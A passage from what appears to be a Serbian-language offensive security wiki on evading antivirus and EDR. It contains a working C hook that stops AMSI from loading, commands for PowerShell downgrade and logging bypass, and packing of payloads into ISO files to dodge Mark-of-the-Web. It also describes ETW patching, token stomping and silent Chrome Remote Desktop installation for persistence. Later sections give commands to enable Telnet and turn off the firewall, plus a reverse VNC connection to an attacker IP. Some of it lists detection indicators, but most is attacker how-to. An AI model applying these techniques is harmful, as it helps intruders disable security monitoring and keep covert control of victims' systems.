typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Napomene
- Radi u PowerShell-u, WScript/CScript-u i prilagođenim loader-ima (u svemu što bi inače učitalo AMSI).
- Kombinujte sa prosleđivanjem skripti putem stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli dugačke tragove u komandnoj liniji.
- Primećeno je da ga koriste loader-i pokrenuti preko LOLBins-a (npr. `regsvr32` koji poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skripte za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skripte za zaobilaženje AMSI-ja koje izbegavaju signature pomoću nasumično generisanih korisnički definisanih funkcija, promenljivih i izraza sa znakovima, kao i nasumičnog menjanja veličine slova u PowerShell ključnim rečima.

**Uklonite detektovani signature**

Možete koristiti alate kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da biste uklonili detektovani AMSI signature iz memorije trenutnog procesa. Ovi alati skeniraju memoriju trenutnog procesa u potrazi za AMSI signature-om, a zatim ga prepisuju NOP instrukcijama, čime ga efektivno uklanjaju iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete pronaći na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez njihovog skeniranja pomoću AMSI-ja. To možete uraditi ovako:

```bash
powershell.exe -version 2
```

## PowerShell logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno za potrebe revizije i rešavanja problema, ali može predstavljati i **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite PowerShell verziju 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Koristite unmanaged PowerShell sesiju**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da biste pokrenuli PowerShell bez pokretanja procesa `powershell.exe` (pristup koji koristi Cobalt Strike-ov `powerpick`). Ovo zaobilazi kontrole vezane konkretno za proces `powershell.exe`, ali samo po sebi ne onemogućava AMSI, Script Block Logging niti sve ostale PowerShell odbrane; obuhvat zavisi od runtime okruženja i implementacije hosta.


## Obfuskacija

> [!TIP]
> Nekoliko tehnika obfuskacije oslanja se na šifrovanje podataka, što povećava entropiju binarne datoteke i olakšava AV-ovima i EDR-ovima da je otkriju. Budite oprezni i možda primenite šifrovanje samo na određene delove koda koji su osetljivi ili ih treba sakriti.

### Deobfuskacija .NET binarnih datoteka zaštićenih pomoću ConfuserEx

Pri analizi malware-a koji koristi ConfuserEx 2 (ili komercijalne forkove) često se nailazi na nekoliko slojeva zaštite koji blokiraju dekompilatore i sandbox okruženja. Tok rada u nastavku pouzdano **vraća IL gotovo u originalno stanje**, nakon čega se može dekompilirati u C# alatima kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1.  Uklanjanje anti-tampering zaštite – ConfuserEx šifruje svako *telo metode* i dešifruje ga unutar statičkog konstruktora *modula* (`<Module>.cctor`). Takođe menja PE checksum, pa će svaka izmena izazvati pad binarne datoteke. Koristite **AntiTamperKiller** da biste pronašli šifrovane tabele metapodataka, povratili XOR ključeve i prepravili čisti assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpacker-a.

2.  Oporavak simbola / toka kontrole – prosledite *čistu* datoteku alatu **de4dot-cex** (fork alata de4dot prilagođen za ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Zastavice:
     • `-p crx` – izaberite ConfuserEx 2 profil
     • de4dot će poništiti control-flow flattening, vratiti originalne namespaces, klase i nazive promenljivih i dešifrovati konstantne stringove.

3.  Uklanjanje proxy poziva – ConfuserEx zamenjuje direktne pozive metoda jednostavnim omotačima (poznatim i kao *proxy pozivi*) da bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nakon ovog koraka trebalo bi da vidite uobičajene .NET API-je, kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijeni binarni fajl u dnSpy-ju i potražite velike Base64 blobove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *pravi* payload. Često ga malware čuva kao TLV-kodirani niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Gornji niz koraka vraća tok izvršavanja **bez** potrebe za pokretanjem zlonamernog uzorka – korisno pri radu na offline radnoj stanici.

> 🛈  ConfuserEx generiše prilagođeni atribut pod nazivom `ConfusedByAttribute`, koji može da se koristi kao IOC za automatsku trijažu uzoraka.

#### Jednolinijska komanda
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) compilation suite-a koji omogućava povećanu softversku bezbednost kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštitu od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako se jezik `C++11/14` može koristiti za generisanje obfuskovanog koda u vreme kompajliranja, bez upotrebe eksternih alata i bez modifikovanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih pomoću C++ template metaprogramming framework-a, što će malo otežati život osobi koja želi da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuskuje različite PE datoteke, uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne datoteke.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za fino-grainovanu code obfuscation u jezicima koje podržava LLVM, uz upotrebu ROP-a (return-oriented programming). ROPfuscator obfuskuje program na nivou assembly koda tako što obične instrukcije transformiše u ROP lance i time osujećuje našu uobičajenu predstavu o normalnom toku kontrole.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL datoteke u shellcode i zatim ih učita.

### LLVM compiler-assisted per-function self-masking

Umesto da maskira čitav implant samo dok miruje, modifikovani LLVM X86 backend može da zadrži odabrane funkcije XOR-maskirane kad god nisu aktivne. Function Peekaboo PoC bira demanglovana imena koja sadrže `REG_`, ubacuje position-independent ulazne i izlazne stubove oko konačnog mašinskog koda i emituje jedan zajednički masking handler u `.text`; potpisi na nivou izvornog koda i Windows x64 calling convention ostaju nepromenjeni.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Ovo treba da se obavi nakon izbora instrukcija i optimizacije, jer transformacija mora da obuhvati **svaki emitovani return** i da zna tačan x86 raspored. `MachineFunctionPass` pre emitovanja pronalazi poslednji `MachineInstr::isReturn()`, briše ga da bi se završna putanja nastavila u dodatni epilog i zamenjuje ranije return instrukcije sa `JMP_1 handler`. Zadržite svako uklanjanje steka/okvira koje je kompajler generisao pre svakog return-a; preusmerite samo samu return instrukciju.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `X86AsmPrinter::emitFunctionBodyEnd()` emituju stubove za svaku funkciju, dok `emitEndOfAsmFile()` emituje handler. Simboli koji se dele između faza emitovanja omogućavaju da grana u prologu cilja kasniji epilog; za ručno emitovani near `je`, upišite `0F 84`, a zatim četvorobajtni MC izraz `target - address_after_je`. Pozivi i skokovi ka handler-u mogu umesto toga da se emituju kao `MCInst` objekti (`CALL64pcrel32` i `JMP_1`). Pass mora da vrati `false` za neizabranu funkciju ako nije ništa izmenio; PoC pogrešno vraća `true` u tom slučaju.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC smešta XOR ključ i zapise od 16 bajtova koji sadrže loader-relocated pokazivač na funkciju i dužinu određenu u vreme izvršavanja u `.funcmeta`. Iako je C polje `uint32_t`, handler pristupa QWORD-u na pomeraju `+8` u zapisu, čime obuhvata dužinu i njeno poravnanje, a zapise pomera za `0x10`. Imena PE sekcija imaju samo osam bajtova, pa runtime pretraga vidi `.funcmet`. Eksterni patcher dodaje izvršni `.stub`, čuva stari entry-point RVA u stub-u i preusmerava `AddressOfEntryPoint`; PIC stub dobija image base iz `gs:[0x60]` → `[PEB+0x10]`, prolazi kroz PE32+ import-e da bi razrešio već importovani `VirtualProtect` i pokreće se pre CRT-a.<sup>[[38]](#references)[[39]](#references)</sup>

Inicijalizacija postavlja sentinel u `gs:[0xE8]` i poziva svaku funkciju iz metadata zapisa. Njen prolog, koji je trajno čitljiv, upisuje početak funkcije u `gs:[0xF0]`, prepoznaje sentinel i preskače telo koje još nije maskirano. Epilog zatim koristi `call handler`; pošto handler sačuva 13 registara (`0x68` bajtova), povratna adresa na `[rsp+0x68]` predstavlja kraj transformisane funkcije, pa se `end - start` može upisati u njen metadata zapis. Stub briše sentinel i skače na `ImageBase + original_entry_point_RVA` nakon što su sva tela maskirana.<sup>[[38]](#references)[[39]](#references)</sup>

Tokom uobičajenog poziva, prolog poziva isti simetrični handler da dekodira telo. Završna putanja nastavlja se u dodatni epilog, dok svaki raniji return skače direktno do zajedničkog handler-a. Uobičajeni epilog takođe koristi `jmp handler` umesto `call`, pa nakon ponovnog maskiranja `ret` u handler-u koristi povratnu adresu prvobitnog pozivaoca i čuva rezultat funkcije u `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler pronalazi trenutni zapis, preskače fiksni vidljivi prolog (u ovoj verziji dugačak `0x46` bajtova), menja ostatak u `PAGE_EXECUTE_READWRITE`, XOR-uje ga bajt po bajt koristeći niži bajt ključa, a zatim ga postavlja na `PAGE_EXECUTE_READ`. Ista petlja zato dekodira pri ulasku i kodira pri svakom uobičajenom izlasku.<sup>[[38]](#references)[[39]](#references)</sup>

Indikatori sa visokim signalom za ovaj dizajn obuhvataju:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point unutar izvršnog `.stub` i sekciju `.funcmet` koja sadrži ključ i relocirane pokazivače na `.text`;
- PEB, import-table i section-table parsiranje pre CRT-a, nakon čega slede pozivi preko svakog metadata pokazivača;
- identične PIC prologe `call`/`pop` i mnoštvo return lokacija preusmerenih na jedan handler;
- upise u `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, praćene ponovljenim `VirtualProtect` promenama i bajt-po-bajt XOR upisima u izvršne stranice podržane image-om.

Ovo je izbegavanje memory scanner-a, a ne kriptografska zaštita: zakrpljena datoteka i dalje sadrži prvobitno nemaskirano telo, a debugger može da postavi breakpoint na `VirtualProtect` ili XOR petlju i sačuva aktivnu funkciju. Jednobajtni XOR, čitljivi metadata podaci i fiksna granica `0x46` takođe omogućavaju jednostavan oporavak van mreže.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slot-ovi u PoC-u su thread-local, dok su modifikovane stranice koda zajedničke za ceo proces. Zato istovremeni ili rekurzivni ulasci mogu ponovo da menjaju instrukcije dok se druga instanca izvršava; izuzeci i nelinearni izlazi takođe mogu da zaobiđu ponovno maskiranje. Robusna implementacija mora da sinhronizuje promene, vrati zaštitu koja je zaista vraćena preko `lpflOldProtect`, izbegne hard-coded dužine stub-ova, proveri x64 poravnanje steka u putanjama `call` i `jmp` i pozove `FlushInstructionCache` nakon prepisivanja izvršnih bajtova. Microsoft izričito navodi da je pozivalac odgovoran za usklađenost instruction cache-a kada se izvršni kod menja.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih datoteka sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom koristi pristup zasnovan na reputaciji, što znači da će aplikacije koje se retko preuzimaju aktivirati SmartScreen, koji će upozoriti krajnjeg korisnika i sprečiti pokretanje datoteke (iako se datoteka i dalje može pokrenuti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) pod imenom Zone.Identifier, koji se automatski kreira prilikom preuzimanja datoteka sa interneta, zajedno sa URL-om sa kog su preuzete.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za datoteku preuzetu sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršne datoteke potpisane **pouzdanim** sertifikatom za potpisivanje **neće aktivirati SmartScreen**.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web jeste da ih upakujete u neku vrstu kontejnera, poput ISO-a. Razlog je to što se Mark-of-the-Web (MOTW) **ne može** primeniti na volumene koji **nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Primer upotrebe:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a u ISO datoteke pomoću alata [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za evidentiranje u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **beleže događaje**. Međutim, bezbednosni proizvodi mogu da ga koriste i za nadgledanje i otkrivanje zlonamernih aktivnosti.

Slično načinu na koji se AMSI onemogućava (zaobilazi), moguće je i podesiti da funkcija **`EtwEventWrite`** procesa korisničkog prostora odmah vrati rezultat, bez beleženja događaja. To se postiže zakrpom funkcije u memoriji tako da odmah vrati rezultat, čime se efektivno onemogućava ETW evidentiranje za taj proces.

Više informacija možete pronaći u člancima **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Refleksija C# Assembly-ja

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i još uvek je veoma dobar način za pokretanje post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će payload biti učitan direktno u memoriju, bez upisivanja na disk, moraćemo da vodimo računa samo o zakrpi za AMSI za ceo proces.

Većina C2 okvira (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava izvršavanje C# assembly-ja direktno u memoriji, ali postoje različiti načini za to:

- **Fork\&Run**

Ovaj pristup podrazumeva **pokretanje novog žrtvenog procesa**, ubacivanje zlonamernog post-exploitation koda u taj proces, izvršavanje koda i, po završetku, gašenje novog procesa. Ovaj pristup ima prednosti i mane. Prednost metode fork and run je u tome što se izvršavanje odvija **izvan** procesa našeg Beacon implant-a. To znači da postoji **mnogo veća verovatnoća** da će naš **implant preživeti** ako nešto pođe po zlu tokom post-exploitation aktivnosti ili bude otkriveno. Mana je **veća verovatnoća** da će vas otkriti **bihevioralne detekcije**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ovaj pristup podrazumeva ubacivanje zlonamernog post-exploitation koda **u sopstveni proces**. Tako možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali ako nešto pođe po zlu tokom izvršavanja payload-a, postoji **mnogo veća verovatnoća** da ćete **izgubiti beacon**, jer proces može da se sruši.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da saznate više o učitavanju C# assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# assembly-je možete učitavati i **iz PowerShell-a**. Pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video S3cur3th1sSh1t-a](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Prepakovanje .NET alata u WebAssembly pomoću NativeAOT-a (WasmForge)

Uobičajene tehnike `execute-assembly` zadržavaju prepoznatljiv MSIL i na kraju inicijalizuju CLR. **WasmForge** umesto toga menja okruženje za izvršavanje: prebacuje C# projekat na eksperimentalni NativeAOT-LLVM WASI target, unapred ga kompajlira u WebAssembly i ugrađuje taj modul u Windows PE host zasnovan na Wazero-u. Dobijeni proces ne zahteva CLR, JIT niti `dotnet` host na ciljnom sistemu, pa pravila koja se oslanjaju samo na nazive managed assembly-ja, učitavanje CLR-a, AMSI ili .NET ETW nemaju direktan uvid. Ovo je tehnika za izbegavanje detekcije i pakovanje, a ne zaobilaženje granice privilegija — guest zadržava dozvole i uočljivo ponašanje originalnog alata u OS-u.<sup>[[44]](#references)[[45]](#references)</sup>

### Izgradnja C# projekta

Preporučeni način izgradnje je Docker okruženje projekta, koje uključuje .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker i zavisnosti za potpisivanje. `.csproj` se automatski prepoznaje; jednokratna izgradnja obavlja migraciju, zakrpu kompatibilnosti, WASM kompajliranje, kreiranje PE datoteke i potpisivanje.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Za otklanjanje grešaka ili pregled generisanog koda, podelite proces na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` i završni `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Slika za build takođe koristi omotač `wasm-component-ld` da bi se izbeglo kodiranje WASI Preview 2 komponente i proizveo običan modul koji očekuje ugrađeni runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Povezivanje wasm32 C#-a sa x64 Win32

Ovo nije transparentno ponovno kompajliranje. NativeAOT-WASI nema neke Windows-orijentisane BCL funkcije ili ih menja, a wasm32 guest obično alocira četvorobajtne slotove za pokazivače, dok x64 API-ji mogu da vrate osmobajtne pokazivače. WasmForge rešava oba problema pomoću sledećih generisanih slojeva:<sup>[[44]](#references)</sup>

1. Source patcher ispravlja semantičke razlike specifične za AOT i preusmerava nepodržane pozive za registry, pipes, WMI, identity, directory-service, file-version, LSA i slične funkcije na `Wf*` helpere.
2. P/Invoke scanner emituje NativeAOT `DirectPInvoke` mapiranja, tako da se pozivi `[DllImport]` povezuju sa povezanim C bridge simbolima umesto da se deklarisana DLL učitava dinamički unutar guest-a.
3. Pokazivači vezani za host koriste `ulong` u C#-u i `uint64_t` u C-u. Generički dispatcher prosleđuje poziv Win32 handler-u host-a; `out8_mask` označava stvarne osmobajtne izlazne slotove čije gornje polovine moraju biti sačuvane. Za neoznačene izlaze u obliku wasm32 koristi se zaštita snapshot/restore kako upis x64 vrednosti ne bi oštetio susedna četiri bajta.
4. Namenski host bridge-ovi obrađuju operacije koje se ne uklapaju u generički syscall dispatch, kao što su pristup LSA ticket-cache-u, Kerberos/BCrypt operacije sa strukturisanim rezultatima, TCP KDC saobraćaj i LDAP upiti.

Na primer, wrapper za `version.dll!VerQueryValueW` prosleđuje četiri host adrese i postavlja bitove 2 i 3 (`0xC`), jer su pokazivač na vrednost i dužina osmobajtni izlazni slotovi. Sam wrapper ostaje generički i prosleđuje naziv DLL-a, naziv export-a, argumente i masku funkciji `wf_call_v2`; host obavlja prevođenje pokazivača i poziva nativni API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograničenja i tačke za preusmeravanje detekcije

Kod sa intenzivnim korišćenjem refleksije, dinamičko učitavanje assembly-ja, proizvoljni native callbacks i složene x64 strukture vraćene u WASM memoriju i dalje mogu zahtevati zakrpe za pojedinačne alate ili potpuno otkazati. Generički WASI Preview 2 sockets takođe mogu stići do no-op stubs, pa podržani alati koriste host shim-ove specifične za protokol. Proverite svaku komandu u odnosu na native build umesto da pretpostavljate da su funkcije potpuno usklađene.<sup>[[44]](#references)[[45]](#references)</sup>

Ova tehnika preusmerava telemetriju umesto da payload učini nevidljivim. Detekcija može da se usmeri na PE koji sadrži ili materijalizuje WASM modul, ponašanje runtime-a nalik Wazero-u, neuobičajenu alokaciju i kopiranje host/guest memorije, generičko direktno prosleđivanje poziva ka Win32, anomalije u potpisivanju i PE resursima, kao i na rezultujuće API pozive i mrežni saobraćaj. Zato odsustvo CLR-load, AMSI ili .NET ETW događaja ne treba smatrati dokazom da je proces bezopasan.<sup>[[44]](#references)</sup>

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati zlonamerni kod pomoću drugih jezika tako što će se kompromitovanoj mašini omogućiti pristup **okruženju interpreter-a instaliranom na SMB share-u pod kontrolom napadača**.

Omogućavanjem pristupa Interpreter Binaries i okruženju na SMB share-u možete **izvršavati proizvoljan kod u tim jezicima u memoriji** kompromitovane mašine.

U repozitorijumu se navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti za zaobilaženje statičkih potpisa**. Testiranje nasumičnih, neobfuskovanih reverse shell skripti napisanih u ovim jezicima pokazalo se uspešnim.

## Ponovno hostovanje WebAssembly-ja radi izbegavanja statičke analize

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuliše access token-om bezbednosnog proizvoda kao što je EDR ili AV. Smanjivanje privilegija token-a može omogućiti da proces nastavi da radi, a da pritom ne može da obavlja privilegovane radnje inspekcije ili otklanjanja pretnji.

Da bi se to sprečilo, Windows bi mogao da **spreči spoljne procese** da dobiju handles nad token-ima bezbednosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje pouzdanog softvera

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je instalirati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za preuzimanje kontrole i održavanje persistence:<sup>[[35]](#references)</sup>
1. Preuzmite sa https://remotedesktop.google.com/, kliknite na „Set up via SSH“, a zatim kliknite na MSI datoteku za Windows da biste je preuzeli.
2. Pokrenite instalacioni program neprimetno na računaru žrtve (potrebna su administratorska prava): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite na next. Čarobnjak će zatražiti autorizaciju; kliknite na dugme Authorize da biste nastavili.
4. Izvršite navedenu komandu uz potrebna prilagođavanja: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` postavlja PIN bez korišćenja GUI-ja).
 

## Napredno izbegavanje detekcije

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Izbegavanje detekcije je veoma složena tema. Ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u jednom sistemu, pa je gotovo nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje na koje naiđete imaće svoje prednosti i slabosti.

Toplo preporučujem da pogledate ovo predavanje od [@ATTL4S](https://twitter.com/DaniLJ94) kako biste stekli uvid u naprednije tehnike izbegavanja detekcije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je još jedno odlično predavanje od [@mariuszbit](https://twitter.com/mariuszbit) o višeslojnom izbegavanju detekcije.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Proverite koje delove Defender prepoznaje kao zlonamerne**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** dok **ne utvrdi koji deo Defender prepoznaje kao zlonameran**, a zatim ga izdvojiti.\
Još jedan alat koji radi **istu stvar je** [**avred**](https://github.com/dobin/avred), uz javno dostupan web servis na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows 10, sve verzije Windows-a dolazile su sa **Telnet server-om** koji ste mogli da instalirate (kao administrator) pomoću sledeće komande:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Podesite da se **pokreće** pri pokretanju sistema i **pokrenite** ga sada:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Promeni telnet port (stealth) i onemogući firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, ne instalacioni program)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i podesite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim prebacite binarnu datoteku _**winvnc.exe**_ i **novokreiranu** datoteku _**UltraVNC.ini**_ na **žrtvu**

#### **Obrnuta konekcija**

**Napadač** treba da **pokrene na svom** **hostu** binarnu datoteku `vncviewer.exe -listen 5900`, kako bi bila **spremna** da prihvati obrnutu **VNC konekciju**. Zatim, na **žrtvi**: Pokrenite winvnc daemon pomoću `winvnc.exe -run`, pa pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimećeni, nemojte raditi sledeće:

